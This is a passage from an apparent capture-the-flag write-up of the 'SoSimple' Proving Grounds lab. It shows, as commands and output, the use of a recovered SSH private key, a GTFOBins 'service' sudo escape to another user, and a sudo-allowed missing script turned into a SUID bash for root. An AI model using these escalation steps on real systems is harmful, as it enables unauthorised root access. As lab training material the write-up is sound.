m0Qa+EvvCAajPHDTCR46n2vvMANUFIRhwtDdCeDzzURs1XJCMeiXD+0ovg/mzg2bp1bYp3
2KtNjtorSgKa7NAAAADnJvb3RAc28tc2ltcGxlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/home/max/.ssh$ 
```

### Get SSH access as max

Back at our Kali machine, we recreate the private key.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ vi id_rsa_max   

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ ssh -i id_rsa_max max@$TARGET_IP                                                     
The authenticity of host '192.168.182.78 (192.168.182.78)' can't be established.
ED25519 key fingerprint is SHA256:Uf+LHv3IQHAxDhSDn8gG7d4vQDLZNmF+CRiAydFwEqM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.182.78' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov  8 13:33:04 UTC 2026

  System load:  0.0               Processes:             130
  Usage of /:   55.4% of 8.79GB   Users logged in:       0
  Memory usage: 19%               IPv4 address for ens3: 192.168.182.78
  Swap usage:   0%

 * "If you've been waiting for the perfect Kubernetes dev solution for
   macOS, the wait is over. Learn how to install Microk8s on macOS."

   https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/

386 updates can be installed immediately.
277 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

max@lab-pg-20-ubuntu20-sosimple1-240-132:~$ id
uid=1000(max) gid=1000(max) groups=1000(max),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
max@lab-pg-20-ubuntu20-sosimple1-240-132:~$ 
```

### Enumeration for privesc - part 2

We continue our privesc enumeration and check what we can do with sudo.

```bash
max@lab-pg-20-ubuntu20-sosimple1-240-132:~$ sudo -l
Matching Defaults entries for max on lab-pg-20-ubuntu20-sosimple1-240-132:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User max may run the following commands on lab-pg-20-ubuntu20-sosimple1-240-132:
    (steven) NOPASSWD: /usr/sbin/service
max@lab-pg-20-ubuntu20-sosimple1-240-132:~$ 
```

We can execute [service](https://linux.die.net/man/8/service) as the `steven` user.

### Get a shell as steven

Consulting [GTFOBins](https://gtfobins.org/gtfobins/service/) we get some guidance on how to proceed.

```bash
max@lab-pg-20-ubuntu20-sosimple1-240-132:~$ sudo -u steven /usr/sbin/service ../../bin/bash
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/$ id
uid=1001(steven) gid=1001(steven) groups=1001(steven)
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/$ 
```

### Enumeration for privesc - part 3

Yet again, more enumeration for privesc opportunities.

First, we check the contents of our home directory.

```bash
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/$ pwd
/
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/$ cd /home/steven
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/home/steven$ ls -la
total 28
drwxr-xr-x 3 steven steven 4096 Aug 22  2020 .
drwxr-xr-x 5 root   root   4096 Nov  8 11:48 ..
lrwxrwxrwx 1 steven steven    9 Aug 22  2020 .bash_history -> /dev/null
-rw-r--r-- 1 steven steven  220 Jul 12  2020 .bash_logout
-rw-r--r-- 1 steven steven 3771 Jul 12  2020 .bashrc
drwxrwxr-x 3 steven steven 4096 Jul 13  2020 .local
-rw-r--r-- 1 steven steven  807 Jul 12  2020 .profile
-rwxr-x--- 1 steven steven   42 Aug 22  2020 user2.txt
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/home/steven$ cat user2.txt 
This is not the flag you're looking for..
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/home/steven$ 
```

Nothing that stands out.

Let's check what `steven` can do with `sudo`.

```bash
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/home/steven$ sudo -l
Matching Defaults entries for steven on lab-pg-20-ubuntu20-sosimple1-240-132:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User steven may run the following commands on lab-pg-20-ubuntu20-sosimple1-240-132:
    (root) NOPASSWD: /opt/tools/server-health.sh
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/home/steven$ ls -ld /opt/tools/
ls: cannot access '/opt/tools/': No such file or directory
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/home/steven$ ls -ld /opt/
drwxr-xr-x 2 steven steven 4096 Sep  3  2020 /opt/
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/home/steven$ 
```

Ah, we can run a script that doesn't exist under a directory we have write access to.

### Create the script file

So we can just create the script file with any content we like, such as creating a bash [SUID](https://en.wikipedia.org/wiki/Setuid)-binary.

```bash
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/home/steven$ cd /opt
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt$ mkdir tools
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt$ cd tools
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ vi server-health.sh
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ cat server-health.sh 
#!/bin/bash

cp /bin/bash /tmp/cajac
chmod 4777 /tmp/cajac

steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ chmod +x server-health.sh 
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ ls -l
total 4
-rwxrwxr-x 1 steven steven 60 Nov  8 13:55 server-health.sh
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ 
```

Then we execute the script with `sudo`.

```bash
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ sudo /opt/tools/server-health.sh
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ ls -l /tmp/c*
-rwsrwxrwx 1 root root 1183448 Nov  8 13:55 /tmp/cajac
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ 
```

### Get a shell as root

To get a root shell we execute the SUID-bash like this:

```bash
steven@lab-pg-20-ubuntu20-sosimple1-240-132:/opt/tools$ /tmp/cajac -p
cajac-5.0# id
uid=1001(steven) gid=1001(steven) euid=0(root) groups=1001(steven)
cajac-5.0# 
```

### Get the root flag

And finally we can get the root flag.

```bash
cajac-5.0# cd /root
cajac-5.0# ls -l
total 24
-rw-r--r-- 1 root root    43 Aug 22  2020 flag.txt
-rw------- 1 root root    33 Nov  8 11:48 proof.txt
-rwxr-xr-x 1 root root 12222 Nov  8 11:48 set-net.sh
drwxr-xr-x 4 root root  4096 Jul 12  2020 snap
cajac-5.0# cat proof.txt 
8<REDACTED>a
cajac-5.0# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [bash - Linux manual page](https://www.man7.org/linux/man-pages/man1/bash.1.html)
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [fg - Linux manual page](https://man7.org/linux/man-pages/man1/fg.1p.html)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [HTML - Wikipedia](https://en.wikipedia.org/wiki/HTML)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [reset - Linux manual page](https://linux.die.net/man/1/reset)
- [searchsploit - Homepage](https://www.exploit-db.com/searchsploit)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [service - GTFOBins](https://gtfobins.org/gtfobins/service/)
- [service - Linux manual page](https://linux.die.net/man/8/service)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [Social Warfare Plugin - WPScan](https://wpscan.com/plugin/social-warfare/)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [stty - Linux manual page](https://man7.org/linux/man-pages/man1/stty.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [tty - Linux manual page](https://man7.org/linux/man-pages/man1/tty.1.html)
- [Upgrade shell to TTY shell - Cajac's CTF Notes](https://cajac.gitbook.io/ctf-notes/lat-mov#upgrade-shell-to-tty-shell)
- [WordPress - Wikipedia](https://en.wikipedia.org/wiki/WordPress)
- [WPScan - Documentation](https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation)
- [WPScan - GitHub](https://github.com/wpscanteam/wpscan)
- [WPScan - Homepage](https://wpscan.com/)
